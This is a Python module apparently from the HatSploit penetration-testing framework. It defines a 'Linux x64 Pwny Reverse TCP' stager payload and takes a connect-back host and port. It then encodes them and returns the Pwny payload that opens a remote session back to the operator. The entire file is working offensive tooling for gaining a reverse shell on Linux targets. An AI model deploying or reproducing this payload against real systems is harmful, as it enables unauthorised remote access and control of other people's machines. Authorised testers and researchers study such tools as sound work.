#!/usr/bin/env python3

#
# This payload requires HatSploit: https://hatsploit.netlify.app
# Current source: https://github.com/EntySec/HatSploit
#

from pwny import Pwny
from pwny.session import PwnySession

from hatsploit.lib.payload import Payload
from hatsploit.utils.tcp import TCPClient


class HatSploitPayload(Payload, Pwny):
    details = {
        'Category': "stager",
        'Name': "Linux x64 Pwny Reverse TCP",
        'Payload': "linux/x64/pwny_reverse_tcp",
        'Authors': [
            'Ivan Nikolsky (enty8080) - payload developer'
        ],
        'Description': "Pwny reverse TCP payload for Linux x64.",
        'Comments': [
            ''
        ],
        'Architecture': "x64",
        'Platform': "linux",
        'Rank': "high",
        'Type': "reverse_tcp"
    }

    options = {
        'CBHOST': {
            'Description': "Connect-back host.",
            'Value': TCPClient.get_local_host(),
            'Type': "ip",
            'Required': True
        },
        'CBPORT': {
            'Description': "Connect-back port.",
            'Value': 8888,
            'Type': "port",
            'Required': True
        }
    }

    payload = {
        'Session': PwnySession
    }

    def run(self):
        connback_host, connback_port = self.parse_options(self.options)

        payload_args = self.encode_args(connback_host, connback_port)
        self.payload['Args'] = payload_args

        return self.get_payload(self.details['Platform'],
                                self.details['Architecture'])